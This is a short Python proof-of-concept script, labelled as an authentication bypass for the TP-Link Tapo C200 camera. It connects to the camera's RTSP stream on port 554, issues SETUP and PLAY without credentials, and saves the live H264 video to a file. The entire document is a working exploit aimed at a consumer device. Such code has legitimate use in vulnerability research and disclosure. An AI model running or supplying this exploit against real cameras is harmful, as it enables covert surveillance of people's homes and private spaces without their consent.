import argparse

from control import RTSPClient
from transport import RTPStream


def exploit(args):
    url = f'rtsp://{args.host}:554/stream1'

    with RTSPClient(url) as client, RTPStream() as stream:
    	# send RTSP SETUP
        client.setup(stream.port)

    	# initiate streaming
        client.play()

        with open(args.file,'wb+') as f:
            for chunk in stream.generate():
                f.write(chunk)
                f.flush()


def main():
    parser = argparse.ArgumentParser(description='TP-Link Tapo C200 Auth Bypass PoC')
    parser.add_argument('host',help='IP Address of the Host')
    parser.add_argument('file',help='filename to write H264 output to')
    args = parser.parse_args()
    exploit(args)


if __name__ == '__main__':
    main()
